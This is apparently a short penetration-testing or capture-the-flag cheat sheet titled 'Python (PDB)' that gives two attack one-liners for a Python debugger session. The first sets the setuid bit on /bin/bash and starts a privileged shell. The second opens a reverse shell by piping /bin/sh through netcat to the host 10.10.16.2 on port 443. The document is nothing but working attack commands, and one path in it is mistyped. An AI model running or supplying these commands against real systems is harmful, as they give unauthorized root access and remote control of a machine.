# Python (PDB)

```
import os
os.system (‘chmod u+s /bin/bash’)
#Exit from pdb
/bin/bash -p
```

```
#reverse shell
!(subprocess.getoutput('rm /tnp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 443 >/tmp/f').encode())
```
